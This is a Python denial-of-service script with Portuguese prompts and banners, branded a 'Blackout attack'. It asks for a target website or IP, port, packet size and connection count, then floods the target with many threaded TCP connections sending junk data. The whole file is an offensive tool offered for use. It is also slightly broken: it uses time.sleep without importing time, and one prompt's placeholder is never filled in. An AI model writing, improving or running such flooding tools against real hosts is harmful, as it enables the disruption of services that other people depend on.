import socket
import hashlib
import threading
import questionary
import validators

def blackout(ip, port, size, connections):
    data = hashlib.sha512(str(size).encode()).hexdigest()
    addr = (ip, port)
    errors = 0
    socks = []
    
    for _ in range(connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect(addr)
            socks.append(sock)
        except socket.error as e:
            errors += 1
            print(f"[-] Error connecting to {ip}:{port}: {e}")
            if len(socks) == 0:
                return

    print(f"[*] Launching Blackout attack on {ip}:{port} with {connections} connections...")
    time.sleep(2.5)

    for sock in socks:
        try:
            sock.send(data.encode())
            sock.send('\r\n\r\n'.encode())
            print(f"MANDANDO CHUMBO EM {ip}:{port}")
        except socket.error as e:
            errors += 1
            print(f"[-] ERRO AO ENVIAR OS PACOTES{ip}:{port}: {e}")

    for sock in socks:
        sock.close()

    print("[*] Blackout attack finished")
    print(f"[-] {errors} Errors")

    print("Créditos para o Zed Hacking pelo script de ataque!")

def get_ip_or_domain(ip_or_domain):
    if validators.ipv4(ip_or_domain) or validators.ipv6(ip_or_domain):
        return ip_or_domain
    try:
        ip = socket.gethostbyname(ip_or_domain)
        return ip
    except socket.gaierror:
        raise ValueError(f"Invalid IP address or domain: {ip_or_domain}")

def main():
    print('''

8P d8P 888'Y88 888 88e
 P d8P  888 ,'Y 888 888b
  d8P d 888C8   888 8888D
 d8P d8 888 ",d 888 888P
d8P d88 888,d88 888 88"
            
    ''')

    example_url = "EXEMPLO: www.example.com or 93.184.216.34"

    ip_or_domain = questionary.text("Coloque o site ou ip alvo ({example_url}):").ask()
    ip = get_ip_or_domain(ip_or_domain)

    port = questionary.text("Coloque a porta(default: 80):").ask()
    port = int(port) if port else 80

    size = questionary.text("Coloque o tamanho dos pacotes enviados(default: 1024):").ask()
    size = int(size) if size else 1024

    connections = questionary.text("coloque Número de conexões  (default: 1000):").ask()
    connections = int(connections) if connections else 1000

    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
